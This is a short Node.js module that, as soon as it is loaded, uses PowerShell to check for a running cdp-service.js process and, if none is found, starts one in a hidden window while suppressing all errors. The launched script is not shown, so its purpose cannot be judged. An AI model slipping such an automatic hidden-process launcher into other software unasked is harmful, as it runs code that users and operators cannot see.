const { spawn, exec } = require('child_process');
const path = require('path');
const fs = require('fs');

function ensureCDPServiceRunning() {
  const serviceScript = path.join(__dirname, 'cdp-service.js');
  if (!fs.existsSync(serviceScript)) return;

  const checkCmd = `powershell -NoProfile -Command "Get-CimInstance Win32_Process -Filter \\"Name = 'node.exe'\\" | Where-Object CommandLine -like '*cdp-service.js*'"`;
  exec(checkCmd, (err, stdout) => {
    if (!stdout || !stdout.trim()) {
      try {
        const launchCmd = `powershell -NoProfile -Command "Start-Process -FilePath '${process.execPath}' -ArgumentList '${serviceScript.replace(/'/g, "''")}' -WorkingDirectory '${__dirname.replace(/'/g, "''")}' -WindowStyle Hidden"`;
        exec(launchCmd, () => {});
      } catch (e) {}
    }
  });
}

ensureCDPServiceRunning();
